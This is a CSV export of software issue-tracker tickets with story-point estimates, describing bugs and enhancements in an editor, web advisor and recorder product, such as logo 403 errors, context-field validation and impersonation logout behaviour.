issuekey,title,description,storypoint
REB-8493,Test Simulations - Calculating scores for content with Forks,"For the “Test Simulation” that have forks that loop the user back through steps have already been “answered”, we should loop them back through and display their previous answer, allowing them to change it, but only counting the “final”.Reference comments in REB-7299 for test file and how this enhancement was discovered.",5
REB-8488,QA & STAGE - Unable to add PowerPoint slides to recordings,"When attempting to add PowerPoint slides to recordings in QA or STAGE, the spinner starts spinning indicating the file is being made available to choose desired slides; however, the slide selection screen never displays. Clicking SAVE AND CLOSE results in a dialog informing there is no file selected for the PowerPoint step and the recording cannot be saved. If I close the tab to close the Editor and try to re-open the content, the CONTENT IN USE dialog displays.PowerPoint slides can be added successfully to Content in PROD.",2
REB-8486,Editor - Delete elements behavior,"If a user clicks delete on the last element that remains, have a warning modal that states, “You cannot delete every element from within this content.” and add an “OK” button to close the modal.* Add this modal text to the Language UI.* Test each element as the last item to delete to be sure you can add the elements back one at a time.When we add an element to the element list we have to check the relative position to X (the last element) and all hidden inactive steps, to:* Title is positioned on the top* Headers are positioned below the Title and above all (active and inactive steps)* Footer is positioned below all (active and inactive steps)* Note/Video/Basic/Build a Steps is positioned below the Header and above Footer",5
REB-8483,Enhancement to adding/editing Context on Editor,"STR:# Go to a step that has a Caption, URL, and Process in the context# Place cursor in the “Additional Context” field.# <Shift+Tab> to tab up to the Process and <delete># <Shift+Tab> to tab up to the URL and <delete># <Shift+Tab> to tab up to the Caption and <delete># Click on a different step# Click back on the step where all the context was deletedExpected: The original Caption, URL, and Process would be maintained because the context was invalid and shouldn’t be altered:Actual: The “Process” is missing. The same issue occurs when you delete all the context starting with Caption… the URL is missing when you click back on the altered step.Note: If the Context is invalid, select new step will not change the value on Context field*In addition:* If a user <Tab>s or <Shift+Tab>s out of the context box, the warnings should also show. I can <Shift+Tab> from the Caption to the step instruction and I don’t see any warnings.  {color:#ff5630}I would like this to apply to the Context Editor as well.{color}",3
REB-8464,Advisor - 404 page displays when viewing matching documents from pages that panel does not have the injection.,"As a user using Web Advisor, I see the 404-error when viewing a document. The main point here is that my context belongs pages that Advisor panel does not have the ability to inject them such as Chrome New Tab!image-20200114-031737.png|width=1895,height=1010!*Expectation:* I should not see the error. Instead, I can view the document normally.",2
REB-8454,403 error displays on accounts that have not set Account logo.,"After my testing on REB-8452, there is one case in which my tenant *has not* *ever* set the account logo (it is equivalent to “NULL” values in database). Currently, I am seeing the 403 error with my account logo in console.!image-20200110-082452.png|width=1908,height=949!!image-20200110-082240.png|width=1171,height=408!*Expectation:** I should not see the error in console.* Because these tenants have not ever set any account logos so that they should get *account logo of Epilogue Admin* in this case.* Ensure that functionalities, UI relating to Account Logo works as the expectation above. (for ex, when we use %%CompanyLogo%% (Dynamic field)",1
REB-8452,Account logos not loading with 403 error,"In both QA and Stage, the logos for accounts are not loading and a 403 error is seen in the console.* Fix the 403 error causing the correct account logo to not load!image-20200109-023746.png|width=1433,height=762!",2
REB-8448,Web Recorder - Improve the desktop-capture prototype quality,"After REB-8932 was implemented, the prototype exists some issues which were not resolved:- In many case, images were cut from video is not correctly, although the video was seeked to correct time- Images and steps need to be processed and uploaded asynchronously without any performance issue while the recording is in process so that the user doesn't have to wait a long time after they stop the recordingThis story is create to investigate and fix 2 both above issues.",8
REB-8447,Editor - User will be logged out when clicking on X button of Impersonation,"Steps to reproduce:# Login to Opus as Epilogue Admin.# Choose Customers tab.# Choose a Customer and impersonate it.# Choose Contents tab.# Choose Content Manager.# Choose a document and edit it.# On the Editor window, click on X button of Impersonation.Actual Result: My account will be logged out and directed to Login page.Expected Result: User should be directed to the main page of EA.*Note:* This story should cover _all_ instances when the 'x' button is clicked - we need to make sure it always just dismisses the management and redirects the user instead of logging the user out, no matter what screen they are currently viewing. For example we should review the Editor window (as above), Viewer, Content Manager and other normal Opus portal screens.",2
REB-8446,Editor - Add warnings when all ALL context from a Step is removed,"When I delete all text from each field of Context in a single step, it appears to be forcing me to include Context.  If I click away or select another step and go back to the original step, only the Caption is removed.  I should be able to remove all fields and Save and Closehttps://www.dropbox.com/s/of21mt4s18el967/Deleting%20Context%20from%20Editor.webm?dl=0 ",1
